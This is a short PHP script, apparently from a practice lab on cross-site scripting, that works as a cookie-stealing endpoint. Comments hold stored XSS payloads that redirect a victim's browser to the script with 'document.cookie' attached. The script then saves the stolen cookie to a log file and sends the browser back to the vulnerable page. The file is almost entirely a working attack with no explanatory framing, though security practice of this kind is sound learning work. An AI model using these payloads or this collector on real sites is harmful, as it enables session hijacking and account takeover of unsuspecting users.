<?php
    //1.database:<script>document.location="/Practice/security/attacker/cookie.php"</script>
    //2.database:<script>document.location="/Practice/security/attacker/cookie.php?cookie="+document.cookie</script>
    $cookie=$_GET['cookie'];
    file_put_contents('log.txt', $cookie);
    header('Location: /Practice/security/extension_XSS.php');